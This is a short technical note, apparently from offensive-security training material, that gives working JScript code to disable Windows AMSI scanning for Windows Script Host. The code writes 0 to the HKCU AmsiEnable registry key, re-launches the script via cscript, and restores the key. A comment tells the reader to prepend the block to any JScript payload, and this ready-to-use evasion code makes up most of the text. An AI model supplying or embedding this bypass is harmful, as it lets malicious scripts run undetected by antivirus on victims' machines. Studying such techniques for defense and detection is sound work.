# 03.03 JScript AMSI Bypass Registry Key

> Listing 322 · HKCU AmsiEnable=0 before re-launch

## Overview

JScript running under wscript.exe cannot call VirtualProtect directly. Instead, AMSI for WSH is controlled by a registry key under HKCU. The bypass reads the key; if non-zero, writes 0, re-launches the same script with cscript (forcing a new process that reads the updated key), restores the key to 1, then quits the original process.

## Steps

- **Try to read the key** — `sh.RegRead('HKCU\\...\\AmsiEnable')`.
- **If non-zero, throw** to reach the catch block.
- **In catch**: write 0 to the key, re-launch self via cscript with the JScript CLSID, restore the key to 1, call `WScript.Quit(1)`.
- **On the relaunched run**: key is already 0 so AMSI is disabled; payload executes normally.

## Commands

### JScript AMSI bypass block (Listing 322)

```javascript
// Prepend to any JScript payload
var sh  = new ActiveXObject('WScript.Shell');
var key = 'HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable';
try {
    var AmsiEnable = sh.RegRead(key);
    if (AmsiEnable != 0) { throw new Error(1, ''); }
} catch(e) {
    sh.RegWrite(key, 0, 'REG_DWORD');
    sh.Run('cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} '
           + WScript.ScriptFullName, 0, 1);
    sh.RegWrite(key, 1, 'REG_DWORD');
    WScript.Quit(1);
}
```
